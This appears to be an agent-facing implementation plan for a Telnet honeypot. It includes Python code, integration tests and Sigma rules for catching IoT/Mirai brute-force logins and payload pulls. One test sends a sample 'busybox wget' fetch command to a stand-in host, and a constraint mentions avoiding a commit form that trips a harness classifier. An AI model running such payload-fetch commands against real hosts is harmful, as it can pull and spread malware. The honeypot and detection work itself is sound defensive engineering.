<!-- SPDX-License-Identifier: GPL-3.0-or-later -->
# Telnet Honeypot (IoT/Mirai) + Paired Detections — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add a plaintext Telnet honeypot (port 23, service #15) that captures brute-force credentials and, after a threshold/weak-cred match, a fake shell logging commands + payload-pull URLs — reusing the SSH command emulator — paired with two Sigma rules.

**Architecture:** One new service file `services/telnet.py` (`asyncio.start_server`, like ftp/imap). A pure `strip_iac()` helper removes Telnet control bytes; the per-connection handler runs a login brute-force loop (emits `credentials` + `telnet-bruteforce`) then a fake shell that calls the reused `ssh_shell.respond()` and emits `telnet-payload-pull`. Config coerced in `__init__` (per the SSH hardening lesson). No new dependency.

**Tech Stack:** Python 3.10–3.12, stdlib `asyncio`, pytest, PyYAML (lint/guard). Reuses `services/ssh_shell.py::respond`. **No new dependency.**

## Global Constraints

- Run tests with `PYTHONPATH=src /Users/anatneuman/Projects/Lyrebird/.venv/bin/python -m pytest` (plain `python`/`python3` lack pytest).
- Every new source/YAML file starts with `# SPDX-License-Identifier: GPL-3.0-or-later`.
- Commit with **plain** `git commit -s` PLUS the co-author trailer as a second `-m` (do NOT use the inline `git -c user.name=… -c user.email=…` override — it trips the harness classifier). Template:
  `git commit -s -m "<subject>" -m "Co-Authored-By: Claude Opus 4.8 (1M context) <noreply@anthropic.com>"`
- **No dependency change** — stdlib only. Do NOT touch `requirements.txt` or `pyproject.toml`.
- `telnet-bruteforce` and `telnet-payload-pull` are **signal** tags — paired by Sigma rules in Task 3 and must **NOT** be added to `CONTEXT_OR_ANALYTIC_TAGS` in `tests/test_detection_pairing.py`. `credentials` is **already declared** context there — do not touch it. Do NOT modify `services/ssh_shell.py`.
- **TASK-ORDERING:** Task 1 begins emitting `telnet-bruteforce` (and Task 2 `telnet-payload-pull`), whose rules do not exist until Task 3 — so `tests/test_detection_pairing.py` is **RED by design** from Task 1 through Task 2. Tasks 1–2 run the TARGETED test file only (`tests/test_telnet_service.py`), NOT the full suite. Task 3 makes the guard green; Task 4 runs the full suite.
- `telnet` is an `asyncio.start_server` service: integration tests MUST drive client and server in **one** event loop (`asyncio.open_connection` inside a single `asyncio.run`) and poll the JSONL log for events (never a fixed sleep).
- Verified facts: `strip_iac` byte logic (below) was spiked green on IAC DO/WILL/SB…SE/escaped/dangling cases; `respond(command: str) -> tuple[str, dict | None]` returns `(canned_output, {"tool","url"}|None)`.

---

### Task 1: Telnet service — login brute-force capture + IAC strip

**Files:**
- Create: `src/lyrebird/services/telnet.py`
- Modify: `src/lyrebird/config.py` (add the `"telnet"` defaults after the `"ntp"` line)
- Modify: `src/lyrebird/orchestrator.py` (import + REGISTRY entry)
- Test: `tests/test_telnet_service.py` (create)

**Interfaces:**
- Produces: `TelnetService(BaseService)` name="telnet", `self.port`, `self._server`; module `strip_iac(bytes)->bytes`. Emits an `auth` event `tags=["credentials"]`, `request={"user","password","method":"telnet","accepted"}` per attempt, and one `telnet-bruteforce` event `request={"attempts","client","accepted"}` when `attempts >= bruteforce_threshold`. Config keys: `port` 23, `banner`, `accept_after` 3, `weak_creds` [], `bruteforce_threshold` 3. (After accept this task just closes — the shell is Task 2.)

- [ ] **Step 1: Write the failing tests**

Create `tests/test_telnet_service.py`:

```python
# SPDX-License-Identifier: GPL-3.0-or-later
"""Integration tests: Telnet honeypot captures brute-force credentials + IAC."""
import asyncio
import json
import time
from pathlib import Path
import sys

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from lyrebird.events import EventSink  # noqa: E402
from lyrebird.services.telnet import TelnetService, strip_iac  # noqa: E402


def _wait_for_events(log: Path, timeout: float = 10.0):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if log.exists():
            lines = [l for l in log.read_text().splitlines() if l.strip()]
            if lines:
                return [json.loads(l) for l in lines]
        time.sleep(0.05)
    return []


def _mksvc(tmp_path, **cfg):
    log = tmp_path / "e.jsonl"
    sink = EventSink(session="t", log_path=log, echo=False)
    base = {"port": 0, "banner": ""}
    base.update(cfg)
    svc = TelnetService(cfg=base, sink=sink, bind_address="127.0.0.1",
                        data_dir=tmp_path, tls={})
    return svc, sink, log


def test_strip_iac_unit():
    assert strip_iac(b"\xff\xfd\x01root\r\n") == b"root\r\n"   # IAC DO ECHO + root
    assert strip_iac(b"\xff\xff") == b"\xff"                   # escaped IAC
    assert strip_iac(b"ad\xff\xfb\x03min") == b"admin"        # IAC WILL SGA mid-word
    assert strip_iac(b"\xff\xfa\x18\x00x\xff\xf0user") == b"user"  # SB TTYPE ... SE
    assert strip_iac(b"plain\r\n") == b"plain\r\n"
    assert strip_iac(b"root\xff") == b"root"                  # dangling IAC


async def _login(reader, writer, user, password):
    await reader.readuntil(b"login: ")
    writer.write(user + b"\r\n"); await writer.drain()
    await reader.readuntil(b"Password: ")
    writer.write(password + b"\r\n"); await writer.drain()


def test_telnet_bruteforce_deny_then_accept(tmp_path):
    svc, sink, log = _mksvc(tmp_path, accept_after=3, bruteforce_threshold=3)

    async def scenario():
        await svc.start()
        port = svc._server.sockets[0].getsockname()[1]
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        for u, p in [(b"root", b"x"), (b"admin", b"y"), (b"root", b"root")]:
            await _login(reader, writer, u, p)
        await asyncio.sleep(0.1)
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
        await svc.stop()

    asyncio.run(scenario())
    sink.close()
    events = _wait_for_events(log)
    creds = [e for e in events if "credentials" in e.get("tags", [])]
    assert len(creds) == 3
    assert creds[-1]["request"]["accepted"] is True
    assert creds[0]["request"]["accepted"] is False
    bf = [e for e in events if "telnet-bruteforce" in e.get("tags", [])]
    assert bf, "no telnet-bruteforce signal"
    assert bf[0]["request"]["attempts"] == 3
    assert bf[0]["request"]["accepted"] is True
    assert bf[0]["service"] == "telnet"


def test_telnet_weak_cred_accepted_immediately(tmp_path):
    svc, sink, log = _mksvc(tmp_path, accept_after=99, bruteforce_threshold=99,
                            weak_creds=[{"user": "root", "password": "root"}])

    async def scenario():
        await svc.start()
        port = svc._server.sockets[0].getsockname()[1]
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        await _login(reader, writer, b"root", b"root")
        await asyncio.sleep(0.1)
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
        await svc.stop()

    asyncio.run(scenario())
    sink.close()
    events = _wait_for_events(log)
    creds = [e for e in events if "credentials" in e.get("tags", [])]
    assert len(creds) == 1
    assert creds[0]["request"]["accepted"] is True
    assert [e for e in events if "telnet-bruteforce" in e.get("tags", [])] == []


def test_telnet_iac_stripped_from_credentials(tmp_path):
    svc, sink, log = _mksvc(tmp_path, accept_after=1)

    async def scenario():
        await svc.start()
        port = svc._server.sockets[0].getsockname()[1]
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        await reader.readuntil(b"login: ")
        writer.write(b"\xff\xfd\x01root\r\n"); await writer.drain()   # IAC DO ECHO + root
        await reader.readuntil(b"Password: ")
        writer.write(b"admin\r\n"); await writer.drain()
        await asyncio.sleep(0.1)
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
        await svc.stop()

    asyncio.run(scenario())
    sink.close()
    events = _wait_for_events(log)
    creds = [e for e in events if "credentials" in e.get("tags", [])]
    assert creds, "no credentials event"
    assert creds[0]["request"]["user"] == "root"   # IAC bytes stripped
    assert creds[0]["request"]["password"] == "admin"
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `PYTHONPATH=src /Users/anatneuman/Projects/Lyrebird/.venv/bin/python -m pytest tests/test_telnet_service.py -v`
Expected: FAIL — `ModuleNotFoundError: lyrebird.services.telnet`.

- [ ] **Step 3: Add config defaults**

In `src/lyrebird/config.py`, add the `"telnet"` line immediately after the `"ntp"` line:

```python
        "ntp":      {"enabled": True,  "port": 123,  "faketime_delta": 0},
        "telnet":   {"enabled": True,  "port": 23,
                     "banner": "\r\nAM335x/Linux login service\r\n",
                     "accept_after": 3, "weak_creds": [], "bruteforce_threshold": 3},
```

- [ ] **Step 4: Create the service**

Create `src/lyrebird/services/telnet.py`:

```python
# SPDX-License-Identifier: GPL-3.0-or-later
"""Telnet honeypot.

Plaintext IoT/Mirai-style Telnet: captures brute-force credentials, then — after
a threshold or a weak-credential match — a fake shell that logs commands (reusing
the SSH command emulator) while executing and fetching NOTHING.
"""

from __future__ import annotations

import asyncio
from typing import Any

from ..base import BaseService
from .ssh_shell import respond

_IAC = 0xFF


def _int_or(value: Any, default: int) -> int:
    try:
        return int(value)
    except (TypeError, ValueError):
        return default


def strip_iac(data: bytes) -> bytes:
    """Remove Telnet IAC (0xFF) option-negotiation sequences so credentials and
    commands are captured cleanly regardless of client negotiation."""
    out = bytearray()
    i, n = 0, len(data)
    while i < n:
        b = data[i]
        if b != _IAC:
            out.append(b)
            i += 1
            continue
        if i + 1 >= n:                         # dangling IAC at a buffer edge
            break
        c = data[i + 1]
        if c == _IAC:                          # escaped 0xFF -> literal 0xFF
            out.append(_IAC)
            i += 2
        elif c in (0xFB, 0xFC, 0xFD, 0xFE):    # WILL/WONT/DO/DONT <opt>
            i += 3
        elif c == 0xFA:                        # SB ... IAC SE
            j = i + 2
            while j + 1 < n and not (data[j] == _IAC and data[j + 1] == 0xF0):
                j += 1
            i = j + 2
        else:                                  # other 2-byte IAC command
            i += 2
    return bytes(out)


class TelnetService(BaseService):
    name = "telnet"

    def __init__(self, *args: Any, **kwargs: Any) -> None:
        super().__init__(*args, **kwargs)
        self._server: asyncio.AbstractServer | None = None
        # Coerce operator config once here (a bad value must not break capture).
        self.port = _int_or(self.cfg.get("port"), 23)
        self.accept_after = _int_or(self.cfg.get("accept_after"), 3)
        self.bruteforce_threshold = _int_or(self.cfg.get("bruteforce_threshold"), 3)
        weak = self.cfg.get("weak_creds")
        self.weak_creds = ([c for c in weak if isinstance(c, dict)]
                           if isinstance(weak, list) else [])

    async def _readline(self, reader: asyncio.StreamReader) -> str:
        raw = await asyncio.wait_for(reader.readline(), timeout=60)
        if not raw:
            return ""
        return strip_iac(raw).decode("utf-8", "replace").strip("\r\n\x00 ")

    async def _handle(self, reader: asyncio.StreamReader,
                      writer: asyncio.StreamWriter) -> None:
        peer = writer.get_extra_info("peername") or ("?", 0)
        client = f"{peer[0]}:{peer[1]}"
        attempts = 0
        accepted = False
        try:
            writer.write(str(self.cfg.get("banner", "")).encode())
            await writer.drain()
            while not accepted:
                writer.write(b"login: ")
                await writer.drain()
                user = await self._readline(reader)
                if not user and reader.at_eof():
                    return
                writer.write(b"Password: ")
                await writer.drain()
                password = await self._readline(reader)
                attempts += 1
                accept = (any(user == c.get("user") and password == c.get("password")
                              for c in self.weak_creds)
                          or attempts >= self.accept_after)
                self.emit(transport="tcp", src_ip=peer[0], src_port=peer[1],
                          dst_port=self.port, event_type="auth",
                          summary=f"telnet auth user='{user}' accepted={accept}",
                          request={"user": user, "password": password,
                                   "method": "telnet", "accepted": accept},
                          tags=["credentials"])
                if accept:
                    accepted = True
                else:
                    writer.write(b"\r\nLogin incorrect\r\n")
                    await writer.drain()
                    if reader.at_eof():
                        return
            if attempts >= self.bruteforce_threshold:
                self.emit(transport="tcp", src_ip=peer[0], src_port=peer[1],
                          dst_port=self.port, event_type="request",
                          summary=(f"telnet brute-force {attempts} attempts "
                                   f"client={client} accepted=True"),
                          request={"attempts": attempts, "client": client,
                                   "accepted": True},
                          tags=["telnet-bruteforce"])
            # Fake shell is added in Task 2.
        except (asyncio.TimeoutError, ConnectionError):
            pass
        except Exception:
            pass
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

    async def start(self) -> None:
        self._server = await asyncio.start_server(
            self._handle, host=self.bind_address, port=self.port)

    async def stop(self) -> None:
        if self._server:
            self._server.close()
            try:
                await self._server.wait_closed()
            except Exception:
                pass
```

- [ ] **Step 5: Register the service**

In `src/lyrebird/orchestrator.py`, add the import next to the other service imports (after `from .services.tftp import TftpService`):

```python
from .services.telnet import TelnetService
```

and add the REGISTRY entry (in the dict, after the `"ntp"` line):

```python
    "ntp": NtpService,
    "telnet": TelnetService,
```

- [ ] **Step 6: Run the targeted tests to verify they pass**

Run: `PYTHONPATH=src /Users/anatneuman/Projects/Lyrebird/.venv/bin/python -m pytest tests/test_telnet_service.py -v`
Expected: PASS (4 passed). Do NOT run the full suite — the pairing guard is RED by design (`telnet-bruteforce` unpaired until Task 3).

- [ ] **Step 7: Commit**

```bash
git add src/lyrebird/services/telnet.py src/lyrebird/config.py src/lyrebird/orchestrator.py tests/test_telnet_service.py
git commit -s -m "Add Telnet honeypot: capture brute-force credentials + IAC strip + telnet-bruteforce" -m "Co-Authored-By: Claude Opus 4.8 (1M context) <noreply@anthropic.com>"
```

---

### Task 2: Fake shell + `telnet-payload-pull`

**Files:**
- Modify: `src/lyrebird/services/telnet.py` (add `_shell`; call it after accept in `_handle`)
- Test: `tests/test_telnet_service.py` (append)

**Interfaces:**
- Consumes: `respond()` from `ssh_shell` and the accepted session from Task 1. Produces a per-command `request` event `{"command"}` (no tag) and, for a payload-pull command, `tags=["telnet-payload-pull"]` with `{"command","tool","url"}`. Executes/fetches nothing.

- [ ] **Step 1: Write the failing test**

Append to `tests/test_telnet_service.py`:

```python
def test_telnet_shell_captures_commands_and_payload_pull(tmp_path):
    svc, sink, log = _mksvc(tmp_path, accept_after=1, bruteforce_threshold=99)

    async def scenario():
        await svc.start()
        port = svc._server.sockets[0].getsockname()[1]
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        await _login(reader, writer, b"root", b"root")     # accepted (accept_after=1)
        await reader.readuntil(b"# ")                       # shell prompt
        writer.write(b"busybox wget http://10.0.0.9/m\r\n"); await writer.drain()
        await reader.readuntil(b"# ")                       # canned output + next prompt
        writer.write(b"exit\r\n"); await writer.drain()
        await asyncio.sleep(0.1)
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
        await svc.stop()

    asyncio.run(scenario())
    sink.close()
    events = _wait_for_events(log)
    pull = [e for e in events if "telnet-payload-pull" in e.get("tags", [])]
    assert pull, "no telnet-payload-pull signal"
    assert pull[0]["request"]["tool"] == "wget"
    assert pull[0]["request"]["url"] == "http://10.0.0.9/m"
    assert pull[0]["service"] == "telnet"
```

- [ ] **Step 2: Run to verify failure**

Run: `PYTHONPATH=src /Users/anatneuman/Projects/Lyrebird/.venv/bin/python -m pytest tests/test_telnet_service.py::test_telnet_shell_captures_commands_and_payload_pull -v`
Expected: FAIL — after accept the handler closes (no shell), so `readuntil(b"# ")` raises `IncompleteReadError` / no `telnet-payload-pull` event.

- [ ] **Step 3: Add the `_shell` method and call it after accept**

In `src/lyrebird/services/telnet.py`, replace the comment line `# Fake shell is added in Task 2.` with:

```python
            await self._shell(reader, writer, peer)
```

and add this method to `TelnetService` (e.g. after `_handle`):

```python
    async def _shell(self, reader: asyncio.StreamReader,
                     writer: asyncio.StreamWriter, peer) -> None:
        writer.write(b"\r\n# ")
        await writer.drain()
        while True:
            cmd = await self._readline(reader)
            if not cmd:
                if reader.at_eof():
                    break
                writer.write(b"# ")
                await writer.drain()
                continue
            if cmd in ("exit", "logout", "quit"):
                break
            output, pull = respond(cmd)
            writer.write((output + ("\r\n" if not output.endswith("\n") else "")).encode())
            if pull is not None:
                self.emit(transport="tcp", src_ip=peer[0], src_port=peer[1],
                          dst_port=self.port, event_type="request",
                          summary=f"telnet payload-pull {pull['tool']} {pull['url']}",
                          request={"command": cmd, "tool": pull["tool"],
                                   "url": pull["url"]},
                          tags=["telnet-payload-pull"])
            else:
                self.emit(transport="tcp", src_ip=peer[0], src_port=peer[1],
                          dst_port=self.port, event_type="request",
                          summary=f"telnet shell: {cmd}",
                          request={"command": cmd}, tags=[])
            writer.write(b"# ")
            await writer.drain()
```

- [ ] **Step 4: Run the targeted tests to verify they pass**

Run: `PYTHONPATH=src /Users/anatneuman/Projects/Lyrebird/.venv/bin/python -m pytest tests/test_telnet_service.py -v`
Expected: PASS (5 passed). Full suite still NOT run — pairing guard RED until Task 3.

- [ ] **Step 5: Commit**

```bash
git add src/lyrebird/services/telnet.py tests/test_telnet_service.py
git commit -s -m "Telnet: fake shell captures commands + telnet-payload-pull (fetches nothing)" -m "Co-Authored-By: Claude Opus 4.8 (1M context) <noreply@anthropic.com>"
```

---

### Task 3: Paired Sigma rules

**Files:**
- Create: `detections/sigma/telnet_bruteforce.yml`, `detections/sigma/telnet_payload_pull.yml`

**Interfaces:**
- Consumes: `telnet-bruteforce` (Task 1) and `telnet-payload-pull` (Task 2). Makes the pairing guard green.

- [ ] **Step 1: Confirm the guard is currently RED**

Run: `PYTHONPATH=src /Users/anatneuman/Projects/Lyrebird/.venv/bin/python -m pytest tests/test_detection_pairing.py -v`
Expected: FAIL — reports `telnet.py -> ['telnet-bruteforce', 'telnet-payload-pull']` (emitted/unpaired).

- [ ] **Step 2: Create the two rules**

Create `detections/sigma/telnet_bruteforce.yml`:

```yaml
# SPDX-License-Identifier: GPL-3.0-or-later
title: Telnet Brute-Force By Sample (IoT/Mirai Credential Guessing)
id: 3a5c8e17-9b42-4d6f-8e21-0c7b4a9f2d63
status: experimental
description: >
  The Lyrebird Telnet honeypot tags a connection 'telnet-bruteforce' once it
  makes repeated login attempts. In an isolated single-sample lab there are no
  operators, so a sample guessing Telnet credentials is the classic IoT/Mirai
  brute-force tell.
  Pair: services/telnet.py tags such connections 'telnet-bruteforce' (attempts,
  client, and accepted recorded).
author: Lyrebird
date: 2026/07/01
logsource:
  product: lyrebird
  service: telnet
detection:
  selection:
    service: 'telnet'
    tags|contains: 'telnet-bruteforce'
  condition: selection
fields:
  - src_ip
  - request.attempts
  - request.accepted
  - request.client
falsepositives:
  - Legitimate administrators or scanners using Telnet outside a single-sample
    analysis lab
level: medium
```

Create `detections/sigma/telnet_payload_pull.yml`:

```yaml
# SPDX-License-Identifier: GPL-3.0-or-later
title: Second-Stage Payload Pull Over Telnet Shell (IoT Loader)
id: 8f2b6d40-1e57-4a93-b0c8-5d3f9a1e7c24
status: experimental
description: >
  After the Lyrebird Telnet honeypot grants a fake shell, a command that fetches
  a remote payload (wget/curl/tftp/busybox) is tagged 'telnet-payload-pull' with
  the extracted URL. The emulator logs the request but never fetches anything. A
  sample retrieving a second stage over a Telnet shell is the IoT-loader tell.
  Pair: services/telnet.py tags such commands 'telnet-payload-pull' (command,
  tool, url recorded).
author: Lyrebird
date: 2026/07/01
logsource:
  product: lyrebird
  service: telnet
detection:
  selection:
    service: 'telnet'
    tags|contains: 'telnet-payload-pull'
  condition: selection
fields:
  - src_ip
  - request.tool
  - request.url
  - request.command
falsepositives:
  - An administrator fetching a file through an interactive Telnet shell
level: high
```

- [ ] **Step 3: Run the guard + lint to verify pass**

Run: `PYTHONPATH=src /Users/anatneuman/Projects/Lyrebird/.venv/bin/python -m pytest tests/test_detection_pairing.py -v && PYTHONPATH=src /Users/anatneuman/Projects/Lyrebird/.venv/bin/python scripts/lint_sigma.py`
Expected: PASS — pairing guard green (do NOT touch `CONTEXT_OR_ANALYTIC_TAGS`); `Sigma lint OK`.

- [ ] **Step 4: Commit**

```bash
git add detections/sigma/telnet_bruteforce.yml detections/sigma/telnet_payload_pull.yml
git commit -s -m "Pair telnet-bruteforce and telnet-payload-pull signals with Sigma rules" -m "Co-Authored-By: Claude Opus 4.8 (1M context) <noreply@anthropic.com>"
```

---

### Task 4: README, REFERENCE.md, and full-suite verification

**Files:**
- Modify: `README.md` (Services row + count 14 → 15)
- Modify: `REFERENCE.md` (generated)

- [ ] **Step 1: Add the README Services-table row**

In `README.md`, in the `## Services` table, add one row (matching the neighbours' column format), after the SSH row:

```markdown
| Telnet | TCP | ✅ implemented | plaintext IoT/Mirai honeypot; brute-force creds → fake shell logs commands (telnet-bruteforce, telnet-payload-pull) |
```

Then update the service count: change `All fourteen services` to `All fifteen services` (search for "fourteen").

- [ ] **Step 2: Regenerate REFERENCE.md**

Run: `PYTHONPATH=src /Users/anatneuman/Projects/Lyrebird/.venv/bin/python scripts/gen_reference.py`
Expected: `wrote REFERENCE.md`. Then `git status --short` — only `README.md` and `REFERENCE.md` should be modified (two new telnet rule rows). If anything else changed, STOP and report.

- [ ] **Step 3: Run the FULL suite + lint**

Run: `PYTHONPATH=src /Users/anatneuman/Projects/Lyrebird/.venv/bin/python -m pytest tests/ -q && PYTHONPATH=src /Users/anatneuman/Projects/Lyrebird/.venv/bin/python scripts/lint_sigma.py`
Expected: all tests PASS (including `test_reference.py`, `test_detection_pairing.py`, and the new telnet tests); `Sigma lint OK`.

- [ ] **Step 4: Commit**

```bash
git add README.md REFERENCE.md
git commit -s -m "Docs: Telnet service row (15 services); regenerate REFERENCE.md" -m "Co-Authored-By: Claude Opus 4.8 (1M context) <noreply@anthropic.com>"
```

---

## Self-review

**Spec coverage:**
- Plaintext Telnet service, IAC strip, login brute-force → `credentials` + `telnet-bruteforce` → Task 1. ✓
- Fake shell reusing `respond`, `telnet-payload-pull`, fetches nothing → Task 2. ✓
- Two paired rules, `service: telnet` + tag selection, not in `CONTEXT_OR_ANALYTIC_TAGS` → Task 3. ✓
- No `ssh_shell.py` change; no dependency change → Global Constraints. ✓
- README (15 services) + REFERENCE.md + full suite → Task 4. ✓
- One-event-loop + poll-for-artifact tests; brute-force, weak-cred, IAC, shell/payload-pull → Tasks 1–2. ✓
- SPDX headers on new files → included. ✓

**Placeholder scan:** No TBD/TODO; every code step shows complete code; both Sigma `id`s are concrete UUIDs. ✓

**Type consistency:** `request` keys (`user/password/method/accepted`, `attempts/client/accepted`, `command/tool/url`) identical across emits (Tasks 1/2), test assertions, and rule `fields` (Task 3). `respond()` returns `(str, dict|None)` and is consumed that way. `strip_iac`, `self.port/accept_after/bruteforce_threshold/weak_creds`, `_readline`, `_shell` defined in Task 1/2 and used consistently. ✓

**Task-ordering guard:** Task 1 emits the unpaired `telnet-bruteforce` (guard RED by design); Tasks 1–2 run targeted tests only; Task 3 pairs both signals green; Task 4 runs the full suite. Explicit in Global Constraints and each task's run step. ✓
